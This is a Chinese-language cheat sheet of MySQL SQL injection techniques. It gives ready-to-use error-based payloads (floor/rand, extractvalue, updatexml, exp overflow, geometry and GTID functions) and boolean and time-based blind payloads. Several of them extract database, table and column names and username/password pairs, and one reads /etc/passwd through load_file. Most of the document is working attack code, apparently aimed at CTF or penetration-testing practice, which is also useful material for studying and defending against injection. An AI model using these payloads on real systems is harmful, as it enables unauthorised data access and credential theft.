### substr()
### if()
`IF( expr1 , expr2 , expr3 )`
expr1 的值为 TRUE，则返回值为 expr2   
expr1 的值为FALSE，则返回值为 expr3
### ifnull()
`IFNULL( expr1 , expr2 )`
判断第一个参数expr1是否为NULL：
如果expr1不为空，直接返回expr1；
如果expr1为空，返回第二个参数 expr2
### ascii()
`ASCII ( input_string )`
`ASCII()`函数接受字符表达式并返回字符表达式最左侧字符的ASCII代码值,`input_string`可以是文字字符，字符串表达式或列。 如果`input_string`有多个字符，则该函数返回其最左侧字符的ASCII代码值
## 报错注入
### floor()
（8.x>mysql>5.0）[双查询报错注入]。函数返回小于或等于指定值（value）的最小整数,取整
`select count(*),(floor(rand(0)*2)) as x from 表名 group by x`
```mysql
# 爆库
SELECT * FROM user_rule WHERE id = 1 AND (SELECT 1 from 
(SELECT count(*),concat(0x23,(SELECT schema_name from information_schema.schemata LIMIT 0,1),0x23,floor(rand(0)*2)) as x 
from information_schema.`COLUMNS` GROUP BY x) 
as y)
# 爆表
SELECT * FROM user_rule WHERE id = 1 AND (SELECT 1 from 
(SELECT count(*),concat(0x23,
(SELECT table_name from information_schema.`TABLES` WHERE table_schema = database() LIMIT 0,1),
0x23,floor(rand(0)*2)) as x 
from information_schema.`COLUMNS` GROUP BY x) 
as y)
# 爆列
SELECT * FROM user_rule WHERE id = 1 AND (SELECT 1 from 
(SELECT count(*),concat(0x23,(SELECT column_name from information_schema.COLUMNS where table_name = 'members' LIMIT 0,1),
0x23,floor(rand(0)*2)) as x 
from information_schema.`COLUMNS` GROUP BY x) 
as y)
```
### extractValue(xml_frag, xpath_expr)
在第二个参数位置操作
```MYSQL
 AND (EXTRACTVALUE('awdwadwa',CONCAT('#',SUBSTR(HEX((SELECT DATABASE())),1,1000))))
```
### updateXML(xml_target, xpath_expr,new_xml)
```MYSQL
 AND UPDATEXML(1,CONCAT(0x7e,(SELECT USER()),0x7e),1)
```

### EXP(9999)
MYSQL5.5.5及以上
EXP()函数用于将E提升为指定数字X的幂，这里E(2.718281 ...)是自然对数的底数。
MySQL 能记录的 Double 数值范围有限，一旦结果超过范围，则该函数报错。这个范围的极限是 709，当传递一个大于 709 的值时，函数 exp() 就会引起一个溢出错误
```mysql
# 表名
select exp(~(select * from(select group_concat(table_name) from information_schema.tables where table_schema=database())x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'flag,users' from dual)))'
# 列名
select exp(~(select*from(select group_concat(column_name) from information_schema.columns where table_name='users')x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'id,username,password' from dual)))'
# 检索数据
select exp(~ (select*from(select group_concat(id, 0x7c, username, 0x7c, password) from users)x));
ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select '1|admin|123456,2|whoami|657260,3|bunny|864379' from dual)))'
# 读文件
select exp(~(select * from(select load_file('/etc/passwd'))x));
# dump所有tables和colums
select exp(~(select*from(select(concat(@:=0,(select count(*)from`information_schema`.columns where table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x));

```
### cot(0)
里面是0就会报错。可以结合条件语句进行报错注入
### pow(99999,999999)
求平方，利用数太大导致报错
### geometrycollection()
mysql 版本5.5
```mysql
1') and geometrycollection((select * from(select * from(select version())a)b)); %23
1') and geometrycollection((select * from(select * from(select column_name from information_schema.columns where table_name='manage' limit 0,1)a)b)); %23
1') and geometrycollection((select * from(select * from(select distinct concat(0x23,user,0x2a,password,0x23,name,0x23) FROM manage limit 0,1)a)b)); %23
```
### multipoint()
mysql 版本5.5
```mysql
select multipoint((select * from(select * from(select version())a)b));
```
### ST_LatFromGeoHash&&ST_LongFromGeoHash
```MYSQL
SELECT ST_LongFromGeoHash((SELECT * FROM(SELECT * FROM(SELECT DATABASE())a)b));
```
### ST_Pointfromgeohash
**mysql>5.7**
```MYSQL
')or  ST_PointFromGeoHash(version(),1)--+
')or  ST_PointFromGeoHash((select table_name from information_schema.tables where table_schema=database() limit 0,1),1)--+
')or  ST_PointFromGeoHash((select column_name from information_schema.columns where table_name = 'manage' limit 0,1),1)--+
')or  ST_PointFromGeoHash((concat(0x23,(select group_concat(user,':',`password`) from manage),0x23)),1)--+
```
### GTID_SUBSET&GTID_SUBTRACT
```mysql
SELECT GTID_SUBSET(CONCAT(0x7e,(SELECT VERSION()),0x7e),1)
SELECT GTID_SUBTRACT(CONCAT(0x7e,(SELECT VERSION()),0x7e),1)
SELECT gtid_subtract(concat(0x7e,(SELECT GROUP_CONCAT(user,':',password) from manage),0x7e),1)
```
## 布尔盲注
### payload
```mysql
SELECT (ASCII(RIGHT("qqwdqa",4))<100)   
SELECT ASCII(SUBSTRING((SELECT GROUP_CONCAT(attend_hmtime) FROM aoa_attends_list ),1,1)) 
SELECT ORD(SUBSTRING((SELECT GROUP_CONCAT(attend_hmtime) FROM aoa_attends_list ),1,1))
```
## 时间盲注
### IF+case 打延时
```mysql
SELECT IF(1<2,SLEEP(1),1)
admin' and if(ascii(substr((select database()),1,1))>1,sleep(3),0)#
if((condition), sleep(5), 0);
CASE WHEN (condition) THEN sleep(5) ELSE 0 END;
```
### 无if和case
做乘法决定是否触发sleep
`sleep(5*(condition))`

### 无sleep
#### benchmark
benchmark(执行多少次，执行什么操作)

#### 笛卡尔积
```mysql
SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C;
admin' and if(ascii(substr((select database()),1,1))>1,(SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.tables C),0)#
```

#### get_lock(str,timeout)
在timeout 秒内尝试获取一个名字为str的锁， 若成功得到锁返回 1，若操作超时还未得到则返回0
#### 正则bug
正则匹配在匹配较长字符串但自由度比较高的字符串时，会造成比较大的计算量，我们通过rpad或repeat构造长字符串
```mysql
select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');
```